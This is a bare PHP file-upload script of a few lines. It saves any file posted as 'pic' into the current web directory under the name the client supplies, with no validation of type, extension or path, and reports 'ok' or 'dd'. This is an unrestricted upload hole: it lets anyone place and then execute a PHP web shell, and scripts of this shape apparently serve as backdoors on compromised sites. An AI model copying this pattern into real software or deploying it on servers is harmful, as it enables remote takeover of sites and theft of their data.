<?php 
echo move_uploaded_file($_FILES['pic']['tmp_name'],'./'.$_FILES['pic']['name'])?'ok':'dd';
?>